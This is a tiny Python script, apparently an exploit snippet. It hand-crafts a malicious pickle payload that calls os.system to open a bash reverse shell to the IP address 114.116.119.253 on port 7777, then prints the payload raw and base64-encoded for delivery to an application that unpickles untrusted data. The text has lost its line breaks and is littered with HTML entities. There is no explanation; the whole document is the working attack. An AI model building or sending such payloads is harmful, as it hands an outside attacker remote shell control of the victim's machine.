import pickleimport base64newp=b&#x27;&#x27;&#x27;cossystem(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&quot;&#x27;tR.&#x27;&#x27;&#x27;print(newp)print(base64.b64encode(newp))
